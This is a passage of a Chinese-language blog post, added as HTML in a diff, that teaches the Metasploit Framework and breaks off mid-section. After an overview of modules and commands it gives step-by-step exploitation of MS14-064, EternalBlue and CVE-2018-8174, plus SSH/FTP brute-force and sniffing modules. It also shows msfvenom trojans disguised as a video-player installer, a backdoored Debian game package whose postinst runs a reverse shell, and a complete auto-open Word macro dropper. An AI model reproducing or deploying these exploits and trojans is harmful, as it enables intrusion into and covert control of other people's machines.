@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>MSF渗透框架使用 | 叱月的小冰窖</title>
+
+    
+<link href="/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+<meta name="author" content="叱月" />
+<meta name="description" content="MSF渗透工具使用" />
+
+
+
+<meta name="generator" content="Hugo 0.82.1" />
+
+<link rel="canonical" href="https://fool-boop.github.io/posts/msf%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/" />
+
+
+<meta property="og:title" content="MSF渗透框架使用" />
+<meta property="og:description" content="MSF渗透工具使用" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fool-boop.github.io/posts/msf%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/" /><meta property="og:image" content="https://fool-boop.github.io/me/background.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-02T09:40:44&#43;08:00" />
+<meta property="article:modified_time" content="2021-07-02T09:40:44&#43;08:00" />
+
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://fool-boop.github.io/me/background.jpg"/>
+
+<meta name="twitter:title" content="MSF渗透框架使用"/>
+<meta name="twitter:description" content="MSF渗透工具使用"/>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.css">
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/css/OverlayScrollbars.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  a:not(.ui.button):hover {
+    text-decoration: underline;
+  }
+
+  
+  a:not(.ui.button) {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a:not(.ui.button) {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: #79c4ec;
+    
+
+    
+    background-image: url(/me/background.jpg);
+    
+  }
+  
+
+  
+  body.dark {
+    
+    background-color: #363636;
+    
+
+    
+    background-image: url(/me/background-dark.jpg);
+    
+  }
+  
+</style>
+
+
+    
+
+
+
+<link rel="stylesheet" data-highlight href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css" />
+
+
+
+
+
+
+
+    
+    <link rel="stylesheet" href="/css/custom.css" />
+    
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary menu dream-menu">
+
+  <div class="item">
+    <i class="large link bullseye icon dream-flip-toggle" title="翻转！"></i>
+  </div>
+  <div class="item">
+    <i class="large link home icon" title="首页" onclick="window.location.href = 'https:\/\/fool-boop.github.io'"></i>
+  </div>
+  
+  <div class="item">
+    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
+  </div>
+  
+  
+  <div class="item">
+    <i class="large link search icon" onclick="toggleSearch()"></i>
+  </div>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui relaxed centered grid dream-grid dream-grid-single">
+  
+  
+  
+  
+
+  
+  <aside class="sixteen wide mobile sixteen wide tablet three wide computer column dream-single-aside">
+  
+    
+    <div class="ui segment toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#msf渗透工具使用">MSF渗透工具使用</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#一六个模块作用">一、六个模块作用</a>
+      <ul>
+        <li><a href="#1-auxiliary模块">1) auxiliary模块</a></li>
+        <li><a href="#2-exploits模块">2) exploits模块</a></li>
+        <li><a href="#3-payloads模块">3) payloads模块</a></li>
+        <li><a href="#4-encoders模块">4) encoders模块</a></li>
+        <li><a href="#5-nops模块">5) nops模块</a></li>
+        <li><a href="#6-post模块">6) post模块</a></li>
+      </ul>
+    </li>
+    <li><a href="#二初始化介绍">二、初始化介绍</a>
+      <ul>
+        <li><a href="#1--数据库连接命令">1)  数据库连接命令</a></li>
+        <li><a href="#2--框架的安装和使用">2)  框架的安装和使用</a></li>
+        <li><a href="#3--常用命令介绍">3)  常用命令介绍</a></li>
+      </ul>
+    </li>
+    <li><a href="#三常用模块下的工具">三、常用模块下的工具</a>
+      <ul>
+        <li><a href="#1--常见漏洞">1)  常见漏洞</a></li>
+        <li><a href="#2--常见服务渗透">2)  常见服务渗透</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+
+    
+  
+  </aside>
+  
+  <div class="sixteen wide mobile sixteen wide tablet ten wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    <section class="ui top attached segment">
+      <header>
+        <h1 class="ui large header">MSF渗透框架使用<div class="sub header">
+            <div class="left">
+              @
+              
+                
+                  <a href="https://fool-boop.github.io" target="_blank">叱月</a>
+                
+              
+
+              | 
+                  <span data-format="luxon">2021-07-02T09:40:44&#43;08:00</span>
+                
+
+              | 8 分钟阅读
+
+              
+              | 更新于
+                
+                  <span data-format="luxon">2021-07-02T09:40:44&#43;08:00</span>
+                
+              
+            </div>
+
+            
+            <div class="dream-share">
+  <a href="#" class="save-as-image" title="保存为图片" onclick="savePostAsImg()">
+    <i class="save icon"></i>
+  </a>
+  <a href="https://twitter.com/intent/tweet?text=MSF%e6%b8%97%e9%80%8f%e6%a1%86%e6%9e%b6%e4%bd%bf%e7%94%a8&url=https%3a%2f%2ffool-boop.github.io%2fposts%2fmsf%25E6%25A1%2586%25E6%259E%25B6%25E4%25BD%25BF%25E7%2594%25A8%2f" title="Twitter">
+    <i class="twitter icon"></i>
+  </a>
+  <a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffool-boop.github.io%2fposts%2fmsf%25E6%25A1%2586%25E6%259E%25B6%25E4%25BD%25BF%25E7%2594%25A8%2f" title="Facebook">
+    <i class="facebook icon"></i>
+  </a>
+</div>
+
+            
+          </div>
+        </h1>
+      </header>
+
+      <article class="main">
+        
+        <img class="cover" src="/img/msf.jpg" />
+        
+
+        <h2 id="msf渗透工具使用">MSF渗透工具使用</h2>
+<h1 id="渗透工具metasploit-framework">渗透工具——Metasploit Framework</h1>
+<h2 id="一六个模块作用">一、六个模块作用</h2>
+<h3 id="1-auxiliary模块">1) auxiliary模块</h3>
+<blockquote>
+<p>中文名：辅助的；备用的。</p>
+<p>简述：此模块集成了信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能。</p>
+</blockquote>
+<h3 id="2-exploits模块">2) exploits模块</h3>
+<blockquote>
+<p>中文名：剥削；利用。</p>
+<p>简述：利用已发布的系统漏洞进行攻击，此模块对应每一个具体漏洞的攻击方法（主动或被动）。</p>
+</blockquote>
+<h3 id="3-payloads模块">3) payloads模块</h3>
+<blockquote>
+<p>中文名：攻击载荷。</p>
+<p>简述：使用exploits主机之后，真正在目标系统执行的代码或者指令。</p>
+<ul>
+<li>single：这些payload是一体化的，完整的payload，不需要依赖外部的依赖库和软件包。</li>
+<li>stagers：目标主机的配置低时，以传输一个小的payload用以建立连接。</li>
+<li>stages：利用stagers建立的连接下载后续payload。</li>
+</ul>
+</blockquote>
+<h3 id="4-encoders模块">4) encoders模块</h3>
+<blockquote>
+<p>中文名：编码器。</p>
+<p>简述：对payload进行加壳，实现免杀。</p>
+</blockquote>
+<h3 id="5-nops模块">5) nops模块</h3>
+<blockquote>
+<p>中文名：没有。</p>
+<p>简述：提高payload稳定性及维持大小。在渗透攻击构造恶意数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区， 这样当触发渗透攻击后跳转执行ShellCode时，有一个较大的安全着陆区，从而避免受到内存 地址随机化、返回地址计算偏差等原因造成的ShellCode执行失败，提高渗透攻击的可靠性。</p>
+</blockquote>
+<h3 id="6-post模块">6) post模块</h3>
+<blockquote>
+<p>中文名：邮递。</p>
+<p>简述：获取到shell之后的渗透模块，如获取敏感信息和跳板攻击等。</p>
+</blockquote>
+<p><strong>PS：这些模块默认存放文件夹：</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">/usr/shar/metasploit-framework/modules/
+</code></pre></div><h2 id="二初始化介绍">二、初始化介绍</h2>
+<h3 id="1--数据库连接命令">1)  数据库连接命令</h3>
+<blockquote>
+<p>此命令用来管理MSF的数据库的命令，使用之前要进行初始化的操作。</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfdb init     <span style="color:#75715e"># 初始化、启动msf数据库</span>
+msfdb reinit   <span style="color:#75715e"># 删除、重新初始化数据</span>
+msfdb delete   <span style="color:#75715e"># 删除、停止数据库</span>
+msfdb start    <span style="color:#75715e"># 启动Msf数据库</span>
+msfdb stop     <span style="color:#75715e"># 停止msf数据库</span>
+msfdb status   <span style="color:#75715e"># 检查数据库状态信息</span>
+msfdb run      <span style="color:#75715e"># 启动数据库和msf控制台</span>
+</code></pre></div><h3 id="2--框架的安装和使用">2)  框架的安装和使用</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">apt update -y
+apt install metasploit-framework
+service postgresql start
+msfdb init
+msfconsole
+</code></pre></div><p><strong>PS:如果启动过程之中出现错误可卸载重装</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">apt remove metasploit-framework
+rm -rf /usr/share/metasloit-framework
+apt install metasploit-framework
+<span style="color:#75715e">#最新版的Kali如果出现以下启动错误信息</span>
+&lt;!--Unable to find a spec satisfying metasploit-framework <span style="color:#f92672">(</span>&gt;<span style="color:#f92672">=</span> 0<span style="color:#f92672">)</span> in the set. Perhaps the lockfile is corrupted?
+Run <span style="color:#e6db74">`</span>bundle install<span style="color:#e6db74">`</span> to install missing gems.
+--&gt;
+<span style="color:#75715e">#使用以下命令进行修复</span>
+gem update --system
+</code></pre></div><h3 id="3--常用命令介绍">3)  常用命令介绍</h3>
+<ol>
+<li>help或者？：
+<ul>
+<li>显示msfconsole可以使用的命令。help<command>为显示一种命令的用法。</li>
+</ul>
+</li>
+<li>show：
+<ul>
+<li>用show命令查看msf提供的资源。在根目录下执行的话，由于有些模块资源比较多，需要执行show命令要较长的时间。</li>
+<li>show exploits：查看可以使用的exploit。</li>
+<li>除了exploits，还支持all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options。有些选项需要用use使用一个模块后才能使用，比如给show targets。</li>
+</ul>
+</li>
+<li>search：
+<ul>
+<li>搜索模块。</li>
+<li>简单搜索：seach 选项。</li>
+<li>多条件搜索缩小范围：search name:mysql type:exploit platform:linux。</li>
+</ul>
+</li>
+<li>use：
+<ul>
+<li>search找到模块后，用use使用模块。</li>
+<li>用use使用一个模块后，可以使用 show options查看我们需要配置的选项、使用show targets选择目标主机系统、使用show payloads选择payload、使用show advanced查看高级参数、使用show evasion查看用来做混淆、逃避的模块。</li>
+<li>set/setg：
+<ul>
+<li>set ip地址、payload等。我们可以用show missing查看没有设置的参数。</li>
+<li>setg是设置全局变量，避免每个模块都要输入相同的参数。</li>
+</ul>
+</li>
+<li>unset/unsetg：
+<ul>
+<li>取消设置参数。unsetg是取消设置的全局变量。</li>
+</ul>
+</li>
+<li>save：
+<ul>
+<li>设置的参数在下一次启动的时候不会生效，可以用save保存我们使用过程的设置。</li>
+</ul>
+</li>
+<li>check：
+<ul>
+<li>检查目标是否真的存在这个漏洞，大部分模块没有check功能。</li>
+</ul>
+</li>
+<li>back：
+<ul>
+<li>回到msfconsole根目录</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>run或exploit：
+<ul>
+<li>开始使用模块。</li>
+<li>exploit -j：后台运行。</li>
+</ul>
+</li>
+<li>sessions：
+<ul>
+<li>查看当前已经建立的sessions，说明已经拿到了shell。</li>
+<li>sessions -i id 可以进入一个session交互。</li>
+</ul>
+</li>
+<li>load/unload：
+<ul>
+<li>调用外部的扫描命令。</li>
+</ul>
+</li>
+<li>loadpath：
+<ul>
+<li>加载自己本地的模块。</li>
+</ul>
+</li>
+<li>route：
+<ul>
+<li>添加一条路由。比如发往某个子网的流量都通过贡献的机器发送。</li>
+</ul>
+</li>
+</ol>
+<h2 id="三常用模块下的工具">三、常用模块下的工具</h2>
+<h3 id="1--常见漏洞">1)  常见漏洞</h3>
+<h4 id="ms14_064">MS14_064</h4>
+<blockquote>
+<p>Microsoft Windows OLE远程代码执行漏洞，OLE（对象链接与嵌入）是一种允许应用程序共享数据和功能的技术，远程攻击者利用此漏洞通过构造的网站执行任意代码，影响Win95+IE3 – Win10+IE11全版本&hellip;metasploit里已经加入了此漏洞的利用模块 ,所在模块路径为：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">exploit/windows/browser/ms14_064_ole_code_execution
+</code></pre></div></blockquote>
+<p><strong>执行流程：</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfconsole   <span style="color:#75715e">#启动MSF</span>
+search ms14	<span style="color:#75715e">#搜索关键字</span>
+use exploit/windows/browser/ms14_064_ole_code_execution	<span style="color:#75715e">#加载漏洞利用模块</span>
+set AllowPowershellPrompt true <span style="color:#75715e">#允许利用此漏洞尝试powershell</span>
+set payload windows/meterpreter/reverse_tcp <span style="color:#75715e">#设置windows攻击载荷</span>
+exploit
+</code></pre></div><hr>
+<p><strong>获取成功截图</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/1.5428zioy6180.jpg" alt="1"></p>
+<h4 id="ms17_010">MS17_010</h4>
+<p><strong>执行流程</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">search ms17_010
+use auxiliary/scanner/smb/smb_ms17_010
+set rhosts 192.168.100.128	<span style="color:#75715e">#扫描漏洞</span>
+use exploit/windows/smb/ms17_010_eternalblue
+set rhosts 192.168.100.128
+set payload windows/x64/meterpreter/reverse_tcp
+show targets	<span style="color:#75715e">#显示目标类型</span>
+exploit 
+</code></pre></div><p><strong>效果截图</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/2.5zjkj4q8dwg0.jpg" alt="2"></p>
+<h3 id="2--常见服务渗透">2)  常见服务渗透</h3>
+<p><strong>MSF框架可以与扫描神器Nmap结合使用，其命令的参数详情见<a href="https://blog.csdn.net/oracle_microsoft/article/details/2507009">Nmap使用手册</a></strong></p>
+<blockquote>
+<p>下面以Mysql扫描空密码为例，执行流程：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -A 192.168.100.62 -oX sqomiao.xml 
+<span style="color:#75715e">#o：输出 X：文件类型为xml，在msf之中可以使用db_import命令导入文件</span>
+search mysql_login
+use auxiliary/scanner/mysql/mysql_login
+set blank_passwords true
+creds <span style="color:#75715e">#查看成功渗透的记录</span>
+db_export -f xml /opt/virus/bak.xml	<span style="color:#75715e">#导出mysql数据库空密码记录，导出的文件类型仅支持两种xml和pwdump</span>
+db_import /root/sqomiao.xml	<span style="color:#75715e">#导入namp的扫描结果，使用hosts/serices查看导入主机的详细信息，需要注意的是，不论是导出的文件还是导入的文件所包含的不仅仅只是单一的Mysql或者某一服务的信息</span>
+</code></pre></div><p>效果图（由于不是空密码因此自定义设置了正确的用户和密码）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/3.8zo0o58nokg.png" alt="3"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/4.2cudarbga11c.png" alt="4"></p>
+</blockquote>
+<h4 id="信息收集工具总结">信息收集工具总结：</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">auxiliary/scanner/discovery/arp_sweep	<span style="color:#75715e">#扫描局域网存活主机</span>
+auxiliary/sniffer/psnuffle
+<span style="color:#75715e">#局域网密码嗅探工具（嗅探局域网中输入的明文密码）测试：ftp连接命令lftp -u coolman 192.168.100.62 s</span>
+auxiliary/scanner/portscan/syn	<span style="color:#75715e">#半连接的扫描</span>
+auxiliary/scanner/smb/smb_version	<span style="color:#75715e">#基于smb协议扫描</span>
+auxiliary/scanner/smb/smb_enumshares	<span style="color:#75715e">#smb扫描主机</span>
+auxiliary/scanner/smb/smb_lookupsid	<span style="color:#75715e">#smb扫描全部用户（需要知道一个用户账户密码）</span>
+auxiliary/scanner/ssh/ssh_version	<span style="color:#75715e">#ssh扫描工具，协议版本、操作系统 </span>
+auxiliary/scanner/ssh/ssh_login	
+<span style="color:#75715e">#暴力破解ssh密码，需要有字典（默认字典路径：/usr/share/metasploit-framework/data/wordlists）</span>
+auxiliary/scanner/ftp/ftp_version	<span style="color:#75715e">#ftp收集信息，版本号</span>
+exploit/unix/ftp/vsftpd_234_backdoor	<span style="color:#75715e">#ftp后门漏洞</span>
+auxiliary/scanner/ftp/anonymous	<span style="color:#75715e">#ftp匿名登录的漏洞，同样ftp也可以暴力破解</span>
+auxiliary/scanner/ftp/ftp_login	<span style="color:#75715e">#ftp暴力破解工具</span>
+</code></pre></div><h1 id="四恶意软件">四、恶意软件</h1>
+<h4 id="1--msfvenom命令生成木马常见参数详细参数httpsblogcsdnnetqq_17204441articledetails89529990">1)  msfvenom命令生成木马常见参数：<a href="https://blog.csdn.net/qq_17204441/article/details/89529990">详细参数</a></h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">--platform	<span style="color:#75715e">#指定平台</span>
+
+-p	<span style="color:#75715e">#指定payload</span>
+
+-f	<span style="color:#75715e">#指定所属系统下的执行文件类型linux下为elf</span>
+
+-b	<span style="color:#75715e">#去除坏字符</span>
+
+-e	<span style="color:#75715e">#编码方式</span>
+
+-i	<span style="color:#75715e">#编码次数</span>
+
+-o	<span style="color:#75715e">#输出的文件路径和名称</span>
+</code></pre></div><p>Windows下恶意软件生成：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -a x64 --platform windows -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.100.152 LHOST<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -b <span style="color:#e6db74">&#34;\x00&#34;</span> -e x86/shikata_ga_nai -i <span style="color:#ae81ff">10</span> -f exe -o /opt/virus/西瓜影音.exe
+</code></pre></div><p>Linux下恶意软件生成：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.100.152 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>  -b <span style="color:#e6db74">&#34;\x00&#34;</span> -i <span style="color:#ae81ff">10</span> -f elf -o /opt/virus/linux
+</code></pre></div><h4 id="2--deb恶意软件安装包制作">2)  deb恶意软件安装包制作：</h4>
+<ol>
+<li>下载已经发布的软件包解压并添加版本信息和木马程序：</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">apt install --download-only freesweep	<span style="color:#75715e">#仅下载deb文件，以扫雷为例</span>
+dpkg -x freesweep_1.0.1-2_amd64.deb ./free	<span style="color:#75715e">#解压到当前目录的free目录</span>
+msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.100.152 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -b <span style="color:#e6db74">&#34;\x00&#34;</span> -i <span style="color:#ae81ff">10</span> -f elf -o /opt/virus/free/usr/games//freesweep_sources	
+<span style="color:#75715e">#生成木马软件包，需要注意的是在靶机进行安装时需要运行此木马</span>
+tee /opt/virus/free/DEBIAN/control <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39; 
+</span><span style="color:#e6db74">Package: freesweep
+</span><span style="color:#e6db74">Version: 1.0.1-1
+</span><span style="color:#e6db74">Section: Games and Amusement
+</span><span style="color:#e6db74">Priority: optional 
+</span><span style="color:#e6db74">Architecture: amd64
+</span><span style="color:#e6db74">Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
+</span><span style="color:#e6db74">Description: a text-based minesweeper Freesweep is an implementation of the popular minesweeper game, where one tries to find all the mines without igniting any, based on hints given by the computer. Unlike most implementations of this game, Freesweep works in any visual text display - in Linux console, in an xterm, and in most text-based terminals currently in use.
+</span><span style="color:#e6db74">EOF</span>
+<span style="color:#75715e">#创建软件包的信息文件</span>
+tee /opt/virus/free/DEBIAN/postinst <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39;
+</span><span style="color:#e6db74">#!/bin/bash
+</span><span style="color:#e6db74">sudo chmod 755 /usr/games/freesweep_sources
+</span><span style="color:#e6db74">sudo /usr/games/freesweep_sources &amp;	#后台运行
+</span><span style="color:#e6db74">EOF</span>
+<span style="color:#75715e">#安装脚本文件加载后门</span>
+dpkg-deb --build /opt/virus/free/
+<span style="color:#75715e">#重新生成安装软件包安装</span>
+msf的exploit/multi/handler启动监听	<span style="color:#75715e">#设置linux的payload，本机主机地址LHOST，监听端口LPORT</span>
+</code></pre></div><p>2.目标靶机：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dpkg -i free.deb	<span style="color:#75715e">#安装植入后门包</span>
+dpkg -r freesweep	<span style="color:#75715e">#卸载后会话依旧存在</span>
+</code></pre></div><h4 id="3--cve-2018-8174漏洞">3)  CVE-2018-8174漏洞：</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git clone https://github.com/Yt1g3r/CVE-2018-8174_EXP.git	<span style="color:#75715e">#获取地址</span>
+python CVE-2018-8174.py -u http://192.168.100.152/exploit.html -o hack.rtf -i 192.168.100.152 -p 4444	<span style="color:#75715e">#生成病毒网页</span>
+mv exploit.html /var/www/html
+systemctl start apache2.service
+</code></pre></div><p><strong>攻击方开启监听</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">use use exploit/multi/handler	<span style="color:#75715e">#设置监听工具	</span>
+set lhost 192.168.100.set	<span style="color:#75715e">#设置监听地址</span>
+payload windows/shell/reverse_tcp	<span style="color:#75715e">#设置攻击载荷</span>
+exploit
+</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/6.3xfsbf156560.jpg" alt="6"></p>
+<p><strong>靶机状态：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/7.30n7bbfrgrq0.jpg" alt="7"></p>
+<h4 id="4---jre漏洞">4)   JRE漏洞：</h4>
+<blockquote>
+<p><a href="https://pan.baidu.com/s/1xnLUl5CM1bglRhGu5byMgA">jre下载链接 </a>	<button>提取码: itkg</button></p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">use exploit/multi/browser/java_jre17_driver_manager	<span style="color:#75715e">#设置JRE渗透工具</span>
+set payload java/meterpreter/reverse_tcp	<span style="color:#75715e">#设置适合JRE的payload</span>
+set lhost 192.168.100.152	<span style="color:#75715e">#设置源地址</span>
+exploit 
+</code></pre></div><p><strong>获取到session</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/9.5seoec6xsyk0.png" alt="9"></p>
+<p><strong>靶机画面</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/fool-boop/images@master/MetaSploitFramework/8.1pvv1vo03880.jpg" alt="8"></p>
+<h4 id="5--office宏感染word文档获取shell">5)  office宏感染word文档获取shell：</h4>
+<blockquote>
+<ol>
+<li>生成宏病毒</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.100.152 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -e x86/shikata_ga_nai -i <span style="color:#ae81ff">10</span> -f vba-exe
+</code></pre></div><ol start="2">
+<li>新建word文件，新建宏且选择仅用于本文档，复制生成的内容到宏。</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">  Sub Auto_Open<span style="color:#f92672">()</span>
+  	Nndzc12
+  End Sub
+
+  Sub Nndzc12<span style="color:#f92672">()</span>
+  	Dim Nndzc7 As Integer
+  	Dim Nndzc1 As String
+  	Dim Nndzc2 As String
+  	Dim Nndzc3 As Integer
+  	Dim Nndzc4 As Paragraph
+  	Dim Nndzc8 As Integer
+  	Dim Nndzc9 As Boolean
+  	Dim Nndzc5 As Integer
+  	Dim Nndzc11 As String
+  	Dim Nndzc6 As Byte
+  	Dim Vgofvaolfe as String
+  	Vgofvaolfe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Vgofvaolfe&#34;</span>
+  	Nndzc1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dMxkBpMK.exe&#34;</span>
+  	Nndzc2 <span style="color:#f92672">=</span> Environ<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;USERPROFILE&#34;</span><span style="color:#f92672">)</span>
+  	ChDrive <span style="color:#f92672">(</span>Nndzc2<span style="color:#f92672">)</span>
+  	ChDir <span style="color:#f92672">(</span>Nndzc2<span style="color:#f92672">)</span>
+  	Nndzc3 <span style="color:#f92672">=</span> FreeFile<span style="color:#f92672">()</span>
+  	Open Nndzc1 For Binary As Nndzc3
+  	For Each Nndzc4 in ActiveDocument.Paragraphs
+  		DoEvents
+  			Nndzc11 <span style="color:#f92672">=</span> Nndzc4.Range.Text
+  		If <span style="color:#f92672">(</span>Nndzc9 <span style="color:#f92672">=</span> True<span style="color:#f92672">)</span> Then
+  			Nndzc8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+  			While <span style="color:#f92672">(</span>Nndzc8 &lt; Len<span style="color:#f92672">(</span>Nndzc11<span style="color:#f92672">))</span>
+  				Nndzc6 <span style="color:#f92672">=</span> Mid<span style="color:#f92672">(</span>Nndzc11,Nndzc8,4<span style="color:#f92672">)</span>
+  				Put <span style="color:#75715e">#Nndzc3, , Nndzc6</span>
+  				Nndzc8 <span style="color:#f92672">=</span> Nndzc8 + <span style="color:#ae81ff">4</span>
+  			Wend
+  		ElseIf <span style="color:#f92672">(</span>InStr<span style="color:#f92672">(</span>1,Nndzc11,Vgofvaolfe<span style="color:#f92672">)</span> &gt; <span style="color:#ae81ff">0</span> And Len<span style="color:#f92672">(</span>Nndzc11<span style="color:#f92672">)</span> &gt; 0<span style="color:#f92672">)</span> Then
+  			Nndzc9 <span style="color:#f92672">=</span> True
+  		End If
+  	Next
+  	Close <span style="color:#75715e">#Nndzc3</span>
+  	Nndzc13<span style="color:#f92672">(</span>Nndzc1<span style="color:#f92672">)</span>
+  End Sub
+
+  Sub Nndzc13<span style="color:#f92672">(</span>Nndzc10 As String<span style="color:#f92672">)</span>
+  	Dim Nndzc7 As Integer
+  	Dim Nndzc2 As String
+  	Nndzc2 <span style="color:#f92672">=</span> Environ<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;USERPROFILE&#34;</span><span style="color:#f92672">)</span>
+  	ChDrive <span style="color:#f92672">(</span>Nndzc2<span style="color:#f92672">)</span>
+  	ChDir <span style="color:#f92672">(</span>Nndzc2<span style="color:#f92672">)</span>
+  	Nndzc7 <span style="color:#f92672">=</span> Shell<span style="color:#f92672">(</span>Nndzc10, vbHide<span style="color:#f92672">)</span>
+  End Sub
+
+  Sub AutoOpen<span style="color:#f92672">()</span>
+  	Auto_Open
+  End Sub
+
+  Sub Workbook_Open<span style="color:#f92672">()</span>
+  	Auto_Open
+  End Sub
+</code></pre></div><ol start="3">
+<li>复制生成的内容到word文件</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Vgofvaolfe
